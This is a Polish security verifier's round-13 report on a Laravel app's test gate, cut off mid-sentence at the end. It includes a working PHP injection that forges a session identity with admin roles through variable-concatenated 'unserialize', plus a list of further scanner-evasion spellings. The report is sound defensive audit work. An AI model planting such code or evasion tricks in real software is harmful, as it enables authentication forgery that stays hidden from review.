# RUNDA 13 — RAPORT NIEZALEŻNEGO WERYFIKATORA

**SHA mierzone:** `b60c53a64219b1b81d5be461ffeb23b3622a9749` (gałąź `faza-1-retencja`, „b60c53a"; **jest czubkiem** repozytorium w chwili pomiaru).
**Zlecenie:** `docs/ZLECENIA/ZLECENIE-083.md` (runda 13).
**Data pomiaru:** 19.08.2026.
**Stawka:** F1 i F0 zamykają się WYŁĄCZNIE rundą z zerem znalezisk (D-2026-08-07-16).

## Werdykt jednym zdaniem

**Faza NIE zamyka się w tej rundzie. JEDNO znalezisko (WYSOKA).** Bramka na `b60c53a`
jest zielona **22/22**, zgodna z deklaracją autora co do KAŻDEJ liczby (320 testów /
2261 asercji, podłogi RÓWNO 320/2261, perturbacje 66 kontroli / 49 scenariuszy /
0 pominiętych); pięć perturbacji R12 zapala z badanej przyczyny, allowlista wyjątków jest
PUSTA i to jest zmierzone, obie połowy przyrządu działają (wzorcowe pisownie wykryte,
kod niewinny milczy). **Ale naprawa R12-1 (skaner lekserowy pytający o NAZWĘ) MA BRZEG —
ósme piętro tej samej klasy:** nazwa narzędzia omijającego konstruktor, ZBUDOWANA ZE
STAŁYCH LITERAŁÓW PRZEZ ZMIENNE (`$a='unse'; $b='rialize'; $f=$a.$b;`), przechodzi skaner
NIEZAUWAŻONA. To NIE jest granica „nazwa z żądania" pokryta warstwą 3 — wartość nie pochodzi
z żądania, więc warstwa 3 jej nie widzi. Mechanizm forguje tożsamość, a CAŁA bramka milczy.

- **R13-1 (WYSOKA)** — ÓSME PIĘTRO. Skaner `Kod::wywolaniaOmijajaceKonstruktor` odtwarza
  nazwę tylko ze SKLEJENIA SĄSIEDNICH LITERAŁÓW (`'unse'.'rialize'` — łapane). Gdy te same
  dwa literały wpisać najpierw do zmiennych i skleić zmienne (`$a.$b`), skaner NIE śledzi
  wartości zmiennych i zwraca `[]`. Plik produkcyjny (`LogowanieController::powrot`, na
  allowliście, czytający pole KONTRAKTOWE `code`) odtwarza `TozsamoscSesji` deserializacją
  o nazwie sklejonej przez zmienne i woła `SesjaKonta::zaktualizuj` — **cała bramka zostaje
  zielona** (15/15 kontroli wąskiego gardła, w tym „WARUNEK UTRZYMUJĄCY"; Larastan No errors;
  Pint PASS; pełna suita 320 passed identycznie jak bazowo), a runtime daje `sub=ATAK-…`,
  `role=["koordynator","admin-fundacja"]`, `access_exp` w przyszłości. Komentarz kontroli
  („pierwsza osoba, która je wprowadzi, dowie się od bramki") i komentarz `Kod.php`
  („sklejenie … są objęte") są NIEPRAWDZIWE dla sklejenia przez zmienne. To ta sama klasa,
  co R12-1/R6A-4: kontrola oparta na rozpoznaniu KSZTAŁTU (tu: sklejenia bezpośredniego) ma
  brzeg, i brzeg da się przekroczyć.

**Zbieżność rund:** 29 → 9 → 2 → 5 → 1 → 3 → 1 → **1**.

---

## 0. Środowisko pomiaru — własne izolowane klony, NIE `gabinet-perturbacje`

Zgodnie ze zleceniem NIE użyłem stosu `gabinet-perturbacje` (montuje DRZEWO dewelopera).
Trzy efemeryczne klony przypięte do `b60c53a`, refy potomne PRZYCIĘTE PRZED skanem sekretów.
Po pomiarach drzewa wracały KOPIĄ pliku, `git status --porcelain` PUSTE; stosy zgaszone
`down -v`.

| klon | katalog | projekt compose | porty HTTP/PG/Redis | rola |
|---|---|---|---|---|
| klon-a | `D:/tmp/gabinet-r13/klon-a` | `gabinet-r13a` | 8200 / 55550 / 56500 | bramka OD ZERA |
| klon-b | `D:/tmp/gabinet-r13/klon-b` | `gabinet-r13b` | 8201 / 55551 / 56501 | drugi przebieg (`--zostaw`) + żywy stos do sond R13-1 |
| klon-c | `D:/tmp/gabinet-r13/klon-c` | `gabinet-r13c` | 8202 / 55552 / 56502 | PEŁNE perturbacje |
| (subagent) | `D:/tmp/gabinet-r13/klon-b` | `gabinet-r13b` | 8201 / … | pomiar rozstrzygający R13-1 (świeży subagent bez mojego kontekstu) |

**Higiena klonu.** Po sklonowaniu: `git checkout b60c53a`, `remote remove origin`,
`branch -D faza-1-retencja`, `rm -rf .git/refs/remotes .git/refs/tags`, `reflog expire
--expire=now --all` + `gc --prune=now`. Po tym `git rev-list --all --count` = **156**,
historia kończy się na `b60c53a`, krok [21] gitleaks ZIELONY (`no leaks found`, 156 commitów).
Bez przycięcia [21] zapaliłby się na cytatach z commitów potomnych (D-5) — ale `b60c53a`
**jest czubkiem**, refów potomnych i tak nie ma.

Stosy dewelopera `gabinet` (8098) i `gabinet-perturbacje` (8097) **NIETKNIĘTE** (sprawdzone
`docker compose ls` przed i po). Zakaz commitowania w repozytorium projektu utrzymany —
jedyne zapisy to ten raport i `ODPOWIEDZ-083.md`, oba niezacommitowane. W klonach
efemerycznych nie commitowałem (mutacje zakładane i cofane KOPIĄ pliku). Nic nie wypchnięto.

---

## 1. Pełna bramka — wynik LICZBOWY

Przebieg OD ZERA na czystym klonie `klon-a` przypiętym do `b60c53a`
(`bash skrypty/bramka.sh --projekt gabinet-r13a`), **kod wyjścia odczytany WPROST z pliku,
nie z potoku** (`echo "KOD_BRAMKI=$?" > plik`):

```
KOD_BRAMKI=0
BRAMKA OK — 22 kroków, 0 nieudanych
Tests: 2 skipped, 320 passed (2261 assertions)
WYKONANO 320 testów (podłoga: 320)               (RÓWNO — bez zapasu)
sprawdzono 2261 asercji (podłoga: 2261)          (RÓWNO — bez zapasu)
pominięte (nie liczą się do podłogi): 2          (oba: TwierdzeniaKomentarzyTest, dług D-3)
Pint:      PASS 106 files
Larastan (level max): [OK] No errors
gitleaks:  156 commits scanned, no leaks found
czas testów: 55 s
```

**Deklaracja autora (`ODPOWIEDZ-082` §1) POTWIERDZONA co do każdej liczby:**
22/22 · 320/2261 · podłogi RÓWNO 320/2261 · 2 pominięte. Podłogi to JEDNO źródło
`skrypty/podlogi.sh` (`MINIMUM_TESTOW=320`, `MINIMUM_ASERCJI=2261`) — **odczytane z pliku,
nie zacytowane**. Dwa pominięte to oba testy z `TwierdzeniaKomentarzyTest` (dług D-3).

**Drugi, niezależny przebieg** na klonie `klon-b` (projekt `gabinet-r13b`, inne porty,
`--zostaw`): `BRAMKA OK — 21 kroków, 0 nieudanych` (21, bo `--zostaw` pomija krok [22]),
`320 passed (2261)`, `156 commits, no leaks found` — te same liczby na innym klonie,
projekcie i portach.

**Perturbacje — PEŁNY zestaw, własny stos `gabinet-r13c`:**

```
KOD_PERTURBACJI=0
PERTURBACJE OK — 66 kontroli udowodniło, że umie zaświecić czerwono (pominięte: 0)
zmierzone niezależnie: 49 nagłówków „=== PERTURBACJA", 66 znaków ✓, 0 znaków ✗
```

**Zgodne z deklaracją autora (`ODPOWIEDZ-082`: 66 kontroli / 49 scenariuszy /
0 pominiętych) co do każdej liczby.** Lista scenariuszy w `perturbacje.sh` (`WSZYSTKIE=`)
niesie **49** nazw — policzona, nie zacytowana.

---

## 2. Weryfikacja zamknięcia R12-1 (`ODPOWIEDZ-082`) — każda kontrola z §3 zlecenia

Pomiary na żywym stosie `gabinet-r13b` (kontener `gabinet-r13b-app`, PHP 8.4), drzewo
przywracane KOPIĄ pliku; po każdym `git status --porcelain` PUSTE.

### Pięć perturbacji negatywnych — KAŻDA zapala z BADANEJ przyczyny: **BRONI SIĘ**

Pełny zestaw perturbacji (kod 0) zawiera pięć scenariuszy R12, każdy z allowlistą
`--przyczyna "narzędzie omijające konstruktory"` (KOMUNIKAT ASERCJI, nie nazwa testu) oraz
dowodem mutacji (`grep -q "if (false)"`). Wszystkie zapaliły czerwono (kod 1):

| scenariusz | wstrzyknięta pisownia (w `OdswiezanieSesji::stanKonta`, martwa gałąź) | wynik |
|---|---|---|
| `r12_sklejenie` | `$odtworz = 'unse'.'rialize';` | ✓ czerwień z badanej przyczyny |
| `r12_zmienna` | `$f = 'unserialize';` | ✓ czerwień z badanej przyczyny |
| `r12_backslash` | `new \ReflectionClass(self::class)` | ✓ czerwień z badanej przyczyny |
| `r12_refleksja_property` | `new \ReflectionProperty(...)`+`setAccessible` | ✓ czerwień z badanej przyczyny |
| `r12_wektor_calosc` | deserializacja `TozsamoscSesji` + `zaktualizuj` (`'unse'.'rialize'`) | ✓ czerwień z badanej przyczyny |

### Pozytywna — allowlista wyjątków PUSTA: **ZMIERZONE, nie założone**

Skan całego kodu produkcyjnego (`app/`, `routes/`, `bootstrap/`, `config/`) skanerem
`Kod::wywolaniaOmijajaceKonstruktor` na czystym `b60c53a`:

```
PRODUKCJA — trafienia skanera: 0
ALLOWLISTA MOŻE BYĆ PUSTA — zero wystąpień.
```

Zgodne z twierdzeniem autora: zero `unserialize`/`Reflection*`/deserializatorów w produkcji.
Test `WARUNEK UTRZYMUJĄCY` niesie `$dozwolone = []` (allowlista pusta) i przechodzi.

### Przyrządu (OBIE POŁOWY) — wzorce wykryte, kod niewinny milczy: **BRONI SIĘ**

Sonda skanera na plikach pod rękę, kontener PHP 8.4 (`Kod::wywolaniaOmijajaceKonstruktor`):

```
POS unserialize wprost      → ["unserialize"]                       OK-łapie
POS reflection wprost       → ["ReflectionClass"]                   OK-łapie
POS backslash               → ["ReflectionClass"]                   OK-łapie
POS sklejenie literałów     → ["unserialize"]                       OK-łapie
POS zmienna z literału      → ["unserialize"]                       OK-łapie
POS metoda sklejona         → ["newInstanceWithoutConstructor"]     OK-łapie
POS reflection_property     → ["ReflectionProperty","setValue"]     OK-łapie
POS eval                    → ["eval"]                              OK-łapie
NEG json_decode             → []                                    OK-cisza
NEG var_export              → []                                    OK-cisza
NEG middleware $next        → []                                    OK-cisza
NEG sklejenie komunikatu    → []                                    OK-cisza
```

Osiem pisowni wzorcowych wykrytych, cztery formy niewinne (json_decode, var_export,
`$next($request)`, sklejenie komunikatu) milczą. Kontrola NIE jest ani ślepa, ani nadgorliwa
— **w zakresie, w którym patrzy**. Brzeg jej patrzenia opisuje R13-1.

### Warunek zamrożenia — **SPEŁNIONY**

```
git diff --stat b60c53a..HEAD -- . ':(exclude)docs/' ':(exclude)PLAN-FAZ.md'   →  PUSTO
git rev-parse HEAD                                                              →  b60c53a…  (b60c53a JEST czubkiem)
```

Ani jednej linii poza `docs/` ponad `b60c53a`. `.gitleaks.toml` i `.gitignore` w zakresie
zamrożenia — bez zmian. **Nie znalezisko.**

### Podłogi RÓWNO, D-3/D-4/D-5 — **BRONIĄ SIĘ**

`podlogi.sh`: `320/2261` = bramka, RÓWNO. `TwierdzeniaKomentarzyTest` daje `2 skipped`
(D-3). `.gitleaks.toml` na `b60c53a`: wyjątek D-4 (przynęta `perturbuj.py`, base64 literał)
ORAZ D-5 (cytat sekretu `GOCSPX-…` z rundy 9, „ten sam cytat wrócił 19.08 w commicie
dokumentacyjnym") OBA obecne — żaden nie usunięty pojedynczo. **Nie znalezisko.**

---

## 3. ZNALEZISKO — R13-1 (WYSOKA)

### ÓSME PIĘTRO: skaner lekserowy odtwarza nazwę tylko ze SKLEJENIA BEZPOŚREDNIEGO — sklejenie przez zmienne omija go, tożsamość sforgowana, bramka milczy

**Co naprawiono w R12-1 (do zweryfikowania).** Stara denylista trzech pisowni ustąpiła
skanerowi `Kod::wywolaniaOmijajaceKonstruktor`, który przez lekser pyta o NAZWĘ narzędzia,
nie o jej pisownię: goły identyfikator, literał w zmiennej, **sklejenie literałów przez `.`**,
nazwa z backslashem, klasa refleksji z runtime. Autor deklaruje (`Kod.php`, komentarz metody):
„Warianty z §3 zlecenia (**sklejenie**, zmienna z literału, backslash, dynamiczna metoda) są
objęte", a jedyną nazwaną granicą jest „nazwa zbudowana ze ZMIENNEJ **o wartości z żądania**"
— rzekomo pokryta warstwą 3.

**Dziura.** Skaner odtwarza nazwę wyłącznie ze SKLEJENIA SĄSIEDNICH LITERAŁÓW
(`sklejLiteraly` idzie po tokenach `T_CONSTANT_ENCAPSED_STRING` łączonych `.`). **Nie śledzi
wartości zmiennych.** Gdy te same dwa literały wpisać najpierw do zmiennych i skleić zmienne,
skaner widzi osobno `'unse'` i `'rialize'` — żaden nie jest nazwą niebezpieczną — i zwraca
`[]`. Zmierzone (kontener PHP 8.4, `Kod::wywolaniaOmijajaceKonstruktor`):

| pisownia | skaner | uwaga |
|---|---|---|
| `'unse'.'rialize'` (sklejenie bezpośrednie) | `["unserialize"]` | łapane (naprawa R12-1) |
| `$a='unse'; $b='rialize'; $f=$a.$b;` | **`[]`** | **ślepe — sklejenie przez zmienne** |
| `$f='unser'; $f.='ialize';` | `[]` | ślepe — `.=` |
| `implode('',['unse','rialize'])` | `[]` | ślepe — tablica literałów |
| `strrev('ezilairesnu')` | `[]` | ślepe |
| `sprintf('%s%s','unse','rialize')` | `[]` | ślepe |
| `$k='Reflection'.'Cla'; $k.='ss'; new $k()` | `[]` | ślepe — `new $zmienna` sklejona |
| heredoc/nowdoc z `unserialize` | `[]` | ślepe |

**To NIE jest granica „nazwa z żądania".** Wartość `'unse'`/`'rialize'` to STAŁE LITERAŁY
w źródle, nie dane z żądania. Warstwa 3 (`WaskieGardloZapisuTozsamosciTest`) zapala TYLKO na
odczycie pola żądania spoza kontraktu — a mój wektor nie czyta żadnego pola spoza kontraktu
(`sub` mogę zaszyć na sztywno; w dowodzie użyłem `code`, które JEST w kontrakcie, więc
warstwa 3 milczy słusznie). Autor przewidział ósme piętro w miejscu „nazwa z żądania,
warstwa 3"; **jest ono gdzie indziej — w samym rozpoznaniu kształtu przez skaner, bez żadnego
backstopu.**

**Mechanizm eksploatujący** (wstawiony do `powrot()` w `LogowanieController.php` — plik na
allowliście tożsamości, trasa `/auth/callback`, czyta pole KONTRAKTOWE `code`; zapis przez
`zaktualizuj`, którego warstwa 2 NIE ogranicza — ogranicza tylko `zaloz`):

```php
$wstrzyk = $request->query('code');                 // pole KONTRAKTOWE → warstwa 3 milczy
if (is_string($wstrzyk) && str_starts_with($wstrzyk, 'ATAK-')) {
    $dane = ['sub'=>$wstrzyk, 'sid'=>'sfx-atak', 'role'=>['koordynator','admin-fundacja'],
             'role_surowe'=>['koordynator'], 'markery'=>[], 'access_exp'=>time()+3600];
    $nazwaKlasy = 'App\\Tozsamosc\\TozsamoscSesji';
    $plod = 'O:'.strlen($nazwaKlasy).':"'.$nazwaKlasy.'":1:{s:4:"dane";'.serialize($dane).'}';
    $czA = 'unse'; $czB = 'rialize';
    $odtworz = $czA.$czB;                            // SKLEJENIE PRZEZ ZMIENNE — skaner ślepy
    $fake = $odtworz($plod);
    if ($fake instanceof TozsamoscSesji) {
        SesjaKonta::zaktualizuj($request, $fake);
        return redirect('/');
    }
}
```

Różnica wobec wektora R12-1 to JEDNA LINIA: `'unse'.'rialize'` (dziś łapane) → `$a.$b`
(nie łapane). `serialize(` nie jest na liście; `TozsamoscSesji` powstaje przez deserializer,
nie przez zakazany `new ReflectionClass`. `$fake` zawężone `instanceof` (żeby przeszła
statyka), więc `zaktualizuj(Request, TozsamoscSesji)` przyjmuje.

**Co zmierzone (stos `gabinet-r13b`, drzewo przywracane kopią):**

```
WaskieGardloTozsamosciTest + WaskieGardloZapisuTozsamosciTest → 15 passed (83 asercje)
   w tym „WARUNEK UTRZYMUJĄCY: kod produkcyjny nie używa Reflection ani unserialize" → ZIELONE
PEŁNA SUITA (./vendor/bin/pest)            → 2 skipped, 320 passed (2261)  ← identycznie jak bazowo
Larastan (level max)                       → [OK] No errors
Pint (LogowanieController.php)             → PASS
```

**DOWÓD RUNTIME forgingu tożsamości** (jądro aplikacji w kontenerze, `powrot()` z
`?code=ATAK-KOORDYNATOR-13`, sesja `array`):

```
status powrot: 302
TozsamoscSesji != null: TAK
sub  = ATAK-KOORDYNATOR-13              ← wartość podana przez żądającego
role = ["koordynator","admin-fundacja"]  ← eskalacja pionowa (nie było w role_surowe)
access_exp w przyszłości: TAK          ← przeżywa odświeżenie, `stanKonta`/`ja` ją oddaje
```

Bez callbacku OIDC, bez wymiany kodu, bez weryfikacji podpisu — dokładnie to, czego §2
CLAUDE.md zabrania, a co ściana typu i jej strażnik miały uczynić „niewyrażalnym".

**Pomiar rozstrzygający — świeży subagent bez mojego kontekstu.** Odtworzył wariant
`$a.$b` od zera na tym samym stosie. Wynik IDENTYCZNY: skaner na `$a.$b` → `[]`
(direct-concat → `["unserialize"]`); `WaskieGardloTozsamosciTest`+zapis 15 passed (warunek
utrzymujący ZIELONY), Larastan „No errors", Pint PASS, pełna suita 320 passed, runtime
`status 302, sub=ATAK-KOORDYNATOR-SUB, role=["koordynator","admin-fundacja"]`; drzewo po
przywróceniu PUSTE. **Rozbieżność ze mną: ŻADNA.**

**Dlaczego znalezisko, a nie znana granica.**
1. **To NIE jest nazwana granica autora.** Autor nazwał granicę „nazwa ze zmiennej o wartości
   Z ŻĄDANIA" i obronił ją warstwą 3. Mój wektor buduje nazwę ze STAŁYCH LITERAŁÓW — wartość
   nie pochodzi z żądania, warstwa 3 jej nie widzi, żadnego backstopu nie ma.
2. **Rozjazd opisu ze stanem.** `Kod.php` twierdzi „sklejenie … są objęte"; objęte jest tylko
   sklejenie BEZPOŚREDNIE. Test `WARUNEK UTRZYMUJĄCY` obiecuje „pierwsza osoba, która je
   wprowadzi, dowie się od bramki" — bramka milczy dla sklejenia przez zmienne. Dokumentacja
   kłamiąca o kodzie (WYTYCZNE).
3. **Precedens ekosystemowy R6A-4 i rdzeń „allowlisty, nie denylisty".** Skaner lekserowy
   to nadal rozpoznanie KSZTAŁTU — tyle że kształtu „sklejenie sąsiednich literałów" zamiast
   „trzech pisowni". Nowy kształt (sklejenie przez zmienne) go omija. Naprawa zamieniła jedną
   kontrolę kształtu na drugą, węższą klasę kształtu — nie na kontrolę patrzącą na SKUTEK.
4. **Perturbacje R12 tego wariantu NIE dotykają.** Pięć scenariuszy wstrzykuje sklejenie
   bezpośrednie, literał w zmiennej, backslash, ReflectionProperty i pełny wektor — **żaden
   nie używa `$a.$b`**. „66 kontroli" jest prawdziwe i nie jest miarą pokrycia tej klasy.

**Waga: WYSOKA.** Jak R12-1: NIE eksploatowalne z zewnątrz na czystym `b60c53a` (na czystym
drzewie mechanizmu NIE MA). Groźny jest **fałszywy spokój**: kontrola reklamuje niezmiennik
„tożsamości nie da się ustanowić bez weryfikacji podpisu" i nosi PISEMNE ZAPEWNIENIE, że
sklejenie jest objęte — a pomiar to zapewnienie obala. Następny autor (albo ktoś z dostępem
do commita) wprowadza forgery **niewidzialnie dla bramki**, w obszarze, który przez siedem
rund był rdzeniem polowania.

**Kierunek naprawy (nie moje zadanie, ale z pomiaru wynika kierunek).** Kryterium architekta
(`ODPOWIEDZ-082` §9): ósme piętro w tym obszarze → **decyzja właściciela**, nie kolejna
naprawa kształtu. Kolejne rozszerzanie skanera (śledzenie `$a.$b`, potem `.=`, potem
`implode`, potem `strrev`, potem stała klasowa…) to ta sama denylista kształtów, o piętro
wyżej — brzeg będzie zawsze. Kontrola patrząca na SKUTEK (np. że w produkcji nie powstaje
`TozsamoscSesji`/`RoszczeniaZweryfikowane` inaczej niż jedyną legalną drogą, egzekwowane
poza samą leksyką) leży poza zakresem tej rundy i jest decyzją projektową.

**Odtworzenie (dokładne polecenia).**
```
# 1. klon + stos
mkdir -p /d/tmp/gabinet-r13 && cd /d/tmp/gabinet-r13
git clone --no-hardlinks /d/KOD/Niepodzielni/gabinet klon-b && cd klon-b && git checkout b60c53a
git remote remove origin; git branch -D faza-1-retencja; rm -rf .git/refs/remotes .git/refs/tags
git reflog expire --expire=now --all && git gc --prune=now      # rev-list --all --count → 156
GABINET_BRAMKA_PORT_HTTP=8201 GABINET_BRAMKA_PORT_POSTGRES=55551 GABINET_BRAMKA_PORT_REDIS=56501 \
  bash skrypty/bramka.sh --projekt gabinet-r13b --zostaw          # stos gabinet-r13b-app

# 2. skaner na czystym drzewie (dowód dziury bez ruszania kodu):
#    <?php require '/srv/gabinet/backend/tests/Wsparcie/Kod.php';
#    var_dump(Tests\Wsparcie\Kod::wywolaniaOmijajaceKonstruktor(token_get_all(
#      "<?php \$a='unse'; \$b='rialize'; \$f=\$a.\$b; \$f(\$p);")));   // → []  (direct-concat → ['unserialize'])

# 3. wstrzyk do backend/app/Http/Controllers/LogowanieController.php:
#    - dodać `use App\Tozsamosc\TozsamoscSesji;`
#    - po bloku `if (! $request->filled('code')) { return redirect('/'); }` wstawić blok z §3 (LF)

# 4. pomiar (kontener; MSYS_NO_PATHCONV=1 przed docker gdy ścieżka z dwukropkiem):
docker exec gabinet-r13b-app sh -c 'cd /srv/gabinet/backend && ./vendor/bin/pest tests/Feature/WaskieGardloTozsamosciTest.php tests/Feature/WaskieGardloZapisuTozsamosciTest.php'  # 15 passed
docker exec gabinet-r13b-app sh -c 'cd /srv/gabinet/backend && ./vendor/bin/phpstan analyse --no-progress'   # No errors
docker exec gabinet-r13b-app sh -c 'cd /srv/gabinet/backend && ./vendor/bin/pint --test app/Http/Controllers/LogowanieController.php'  # PASS
docker exec gabinet-r13b-app sh -c 'cd /srv/gabinet/backend && ./vendor/bin/pest'   # 320 passed
# runtime: Request::create('/auth/callback','GET',['code'=>'ATAK-…','state'=>'x']) → powrot() → SesjaKonta::odczytaj → sub/role

# 5. przywrócić plik KOPIĄ, git status --porcelain → PUSTE. NIE commitować. NIE down -v (jeśli stos jeszcze potrzebny).
```

---

## 4. Próba obalenia CZTERECH twierdzeń autora (`ZLECENIE-083` — priorytet rundy)

| twierdzenie | próba | wynik |
|---|---|---|
| **„Granica »nazwa funkcji z żądania« pokryta warstwą 3"** — najbardziej naturalne miejsce ósmego piętra | zbudowanie nazwy narzędzia BEZ udziału żądania (stałe literały przez zmienne) | **OBALONE (R13-1).** Ósme piętro NIE jest granicą „nazwa z żądania". Nazwa zbudowana ze STAŁYCH literałów przez zmienne omija skaner, a warstwa 3 jej nie widzi (nie czyta żadnego pola spoza kontraktu). Framing „jedyny brzeg = nazwa z żądania, pokryty warstwą 3" jest fałszywy: istnieje brzeg NIEZALEŻNY od żądania, bez żadnego backstopu. |
| **`new $zmienna` z nazwą klasy zbudowaną inaczej niż literałem** | `$k='Reflection'.'Cla'; $k.='ss'; new $k()` | **POTWIERDZONA DZIURA (część R13-1).** Skaner → `[]`. Autor sam to sygnalizował jako brzeg; jest realne i należy do tej samej klasy co R13-1. |
| **Skaner sam używa refleksji w pliku testowym — właściwa granica zasięgu** | szukanie drogi z testu do produkcji | **NIE OBALONE.** `composer.json`: `Tests\` jest WYŁĄCZNIE w `autoload-dev` (`tests/`), poza `autoload` produkcyjnym (`App\`, `Database\*`). Kod produkcyjny nie `require`-uje `tests/`. Refleksja skanera (`ReflectionExtension` w `Kod`, `new ReflectionClass` w testach) nie ładuje się w produkcji. Granica zasięgu trzyma — zgodnie z twierdzeniem autora. |
| **Lista deserializatorów jawna — rozszerzenie spoza listy przeszłoby** | — | **STOI jako jawna granica; SUBSUMOWANE przez R13-1.** Technicznie prawdziwe (deserializator spoza `{unserialize, igbinary_unserialize, msgpack_unpack, wddx_deserialize}` przeszedłby), ale drugorzędne: R13-1 pokazuje, że nawet `unserialize` Z listy jest omijalny przez konstrukcję nazwy. Słabym punktem jest DOPASOWANIE NAZWY, nie kompletność listy. Nie liczę osobno — nie zmienia werdyktu. |

**Obalone jedno (kluczowe, priorytetowe): twierdzenie 1.** R13-1 jest wektorem obalającym —
i pokazuje, że ósme piętro leży poza miejscem, które autor wskazał i obronił.

---

## 5. Odrzucone po pomiarze — NIE są znaleziskami

- **Granica zasięgu skanera (test → produkcja)** — `Tests\` w `autoload-dev`; brak drogi
  z testu do produkcji. Broni się (twierdzenie 3).
- **Refleksja w samym `Kod`/testach** — poza katalogami skanowanymi (`app/routes/bootstrap/
  config`), poza autoloadem produkcyjnym. Nie znalezisko.
- **Warstwa 3 / warstwa 4 same w sobie** — na czystym drzewie i przy moim wektorze milczą
  SŁUSZNIE (wektor R13-1 nie czyta pola spoza kontraktu, nie dotyka `zaloz`). Nie są wadliwe;
  po prostu nie są backstopem dla nazwy budowanej ze stałych.
- **Allowlista wyjątków** — pusta i to ZMIERZONE (skan produkcji → 0). Nie znalezisko.
- **Warunek zamrożenia** (`b60c53a` czubek, `git diff` poza `docs/` PUSTY), **D-3/D-4/D-5 OBA
  obecne, podłogi RÓWNO** — §2. Nie znaleziska.
- **Perturbacje R12 (pięć)** — zapalają z badanej przyczyny, każda z `--przyczyna` =
  komunikatem asercji i dowodem mutacji. Bronią się.
- **Kontrola przyrządu (obie połowy)** — 8 pisowni wykrytych, 4 niewinne milczą. Broni się.
- **Lista deserializatorów jawna** (twierdzenie 4) — jawna granica, subsumowana przez R13-1;
  nie liczę osobno.

---

## 6. Sprzeczne polecenia i koszt cofnięcia (pozycja stała WYTYCZNE)

**Brak.** `ZLECENIE-083` nie koliduje z wcześniejszym poleceniem, z `CLAUDE.md` ani
z `docs/DECYZJE.md`. `b60c53a` JEST czubkiem, więc warunek zamrożenia ma jedną formę
(`git diff` poza `docs/` PUSTY). Koszt cofnięcia znaleziska: zero po mojej stronie — mutacje
w klonach cofnięte kopią pliku, `git status --porcelain` PUSTE, klony do skasowania, stosy
`gabinet-r13*` zgaszone `down -v`.

---

## 7. CZEGO NIE SPRAWDZIŁEM (sekcja OBOWIĄZKOWA)

1. **R13-1 przez pełne jądro HTTP z prawdziwym ciasteczkiem sesji** — dowód runtime zrobiłem
   wywołując `powrot()` bezpośrednio z żądaniem pod ręką (`setLaravelSession(array)`); pełnej
   ścieżki `/auth/callback` przez nginx+php-fpm z roundtripem ciasteczka NIE odtwarzałem.
2. **Warianty R13-1 poza `$a.$b` — tylko na poziomie SKANERA.** `.=`, `implode`, `strrev`,
   `sprintf`, heredoc, `new $zmienna` sklejona — zmierzyłem, że skaner na nie milczy (`[]`),
   ale RUNTIME forging odtworzyłem TYLKO wariantem `$a.$b`. To ta sama klasa i ta sama ścieżka
   zapisu, więc runtime pozostałych jest logicznie równoważny — ale osobno nie mierzony.
3. **Czy R13-1 forguje też `RoszczeniaZweryfikowane`** (i przez `zaloz`, nie `zaktualizuj`)
   — logicznie ta sama droga (deserializacja o nazwie sklejonej przez zmienne), ale osobno
   NIE mierzyłem; mierzyłem `TozsamoscSesji` + `zaktualizuj`.
4. **`SprawdzUniewaznienie`, `RejestrSesji`, back-channel logout, `SladWylogowania`** — nie
   sondowałem mutacjami; perturbacje `logout_failsafe`, `wymuszone_wylogowanie`,
   `uniewaznienie_sid`, `id_token_sesja` zapaliły w pełnym zestawie, poza tym bez osobnych prób.
5. **`WalidatorTokenu` — merytoryka podpisu/DER/`aud`/`iss`/`exp`/`typ`** — czytałem kod,
   ale matematyki DER i wariantów `aud` (string vs tablica) mutacjami nie łamałem.
6. **Fuzzing parsera `Kod::funkcje()` / `polaZadaniaCzytaneW` / `sklejLiteraly`** — sprawdziłem
   `sklejLiteraly` na sklejeniu bezpośrednim i przez zmienne; zagnieżdżonych domknięć, `match`,
   heredoc z klamrami i innych patologii parsera osobno nie łamałem.
7. **`TwierdzeniaKomentarzyTest`** (D-3) — poza bramką; potwierdziłem tylko, że to on daje
   `2 skipped`.
8. **`odczyt-przyczyn.py` / tryb DYNAMICZNY allowlist** — nie odtwarzałem.
9. **Merytoryka retencji F1** — perturbacje `retencja`, `retencja_wykonanie`, `zwolnienia`
   zapalają w pełnym zestawie; poza tym mutacjami nie sondowałem.
10. **Współbieżność** (`CLAUDE.md` §6, 100 równoczesnych żądań) — poza suitą, zakres F3.
11. **CI (GitHub Actions)** — nie uruchamiałem; bramka mierzona wyłącznie lokalnie.
12. **Kontrakty wobec `konta/`, `hub/`, `helpdesk/`** — poza zasięgiem rundy.
13. **O-6c (`kształt wartości w docs/`) i O-7 (`.zakres-sesji` wersjonowane)** — termin: okno
    scaleniowe; nie sprawdzałem (nie w zakresie rundy pomiarowej F1/F0).

---

## 8. Zakres pokryty — dla jawności (żeby dało się go zakwestionować)

Zmierzone: pełna bramka OD ZERA (22 kroki, 320/2261 RÓWNO z podłogami odczytanymi z
`podlogi.sh`, kod 0 odczytany WPROST, `no leaks found`, 156 commitów po przycięciu) na czystym
klonie `b60c53a`; drugi niezależny przebieg na drugim klonie/projekcie/portach; PEŁNY zestaw
perturbacji (66 kontroli / 49 scenariuszy / 0 pominiętych, kod 0), policzony niezależnie
(49 nagłówków, 66 ✓, 0 ✗); zamknięcie R12-1 — pięć perturbacji negatywnych zapalających
z badanej przyczyny (`--przyczyna` = komunikat asercji + dowód mutacji), pozytywna (allowlista
pusta, skan produkcji → 0), przyrządu OBIE POŁOWY (8 pisowni wykrytych, 4 niewinne milczą);
warunek zamrożenia; D-3/D-4/D-5; **cztery twierdzenia autora — próba obalenia, twierdzenie 1
OBALONE (R13-1), 3 obroniło się, 2 potwierdzone jako dziura tej samej klasy, 4 subsumowane**;
JEDNO znalezisko (R13-1) z żywym mechanizmem, dowodem skutku przez jądro aplikacji, kontrolą
przyrządu i pomiarem rozstrzygającym świeżego subagenta bez rozbieżności.

**Czego zakres NIE obejmuje** — sekcja §7 (13 pozycji). W szczególności: pełnej ścieżki HTTP
dla R13-1, runtime pozostałych wariantów sklejenia, forgingu `RoszczeniaZweryfikowane`,
merytoryki walidatora tokenu, fuzzingu parsera, sond mutacyjnych rejestru sesji/wylogowania,
współbieżności F3, CI, długów okna scaleniowego (O-6c, O-7).

**Zbieżność rund:** 29 → 9 → 2 → 5 → 1 → 3 → 1 → **1**.

**Faza F1/F0 pozostaje OTWARTA — jedno znalezisko. Runda nie kończy się zerem.**
Fazę zamyka wyłącznie runda z zerem znalezisk (D-2026-08-07-16) — kryterium nie łagodzę.
R13-1 leży w tym samym wąskim gardle tożsamości co rundy 6–12, o piętro wyżej: skaner
lekserowy zamknął siódme piętro (denylista pisowni), a jego własny sposób odtwarzania nazwy
(tylko ze sklejenia BEZPOŚREDNIEGO) jest ósmym piętrem tej samej klasy — kontrola oparta na
